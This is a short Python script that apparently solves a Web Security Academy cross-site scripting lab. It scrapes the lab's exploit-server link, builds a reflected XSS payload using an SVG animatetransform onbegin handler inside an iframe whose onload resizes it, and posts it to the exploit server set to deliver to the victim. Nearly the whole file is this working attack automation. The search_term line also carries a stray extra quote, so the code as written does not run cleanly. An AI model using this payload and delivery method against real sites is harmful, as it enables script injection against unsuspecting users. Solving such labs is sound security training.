import requests, sys
from bs4 import BeautifulSoup
import urllib.parse
site = 'accc1f6e1e84e8fec04741d500a00079.web-security-academy.net'

odin_id='madler'

site_url = f'https://{site}/'
resp = requests.get(site_url)
soup = BeautifulSoup(resp.text,'html.parser')
exploit_url = soup.find('a', {'id':'exploit-link'}).get('href')

exploit_html = f'''<h1>{odin_id}</h1>'''


search_term = '''<svg><animatetransform onbegin=alert(1)>''''
print(f'Search payload to perform XSS is {search_term}')
exploit_html = f'''<iframe src="https://{site}/?search={search_term}" onload=this.style.width='100px'></iframe>'''

input(f'Store onto Exploit Server: {exploit_html}')
formData = {
    'urlIsHttps': 'on',
    'responseFile': '/exploit',
    'responseHead': 'HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8',
    'responseBody': exploit_html,
#    'formAction': 'STORE'
    'formAction': 'DELIVER_TO_VICTIM'
}

print(f'Malicious iframe loading the XSS makes width small so it must be resized on load:\n{exploit_html}')
resp = requests.post(exploit_url, data=formData)



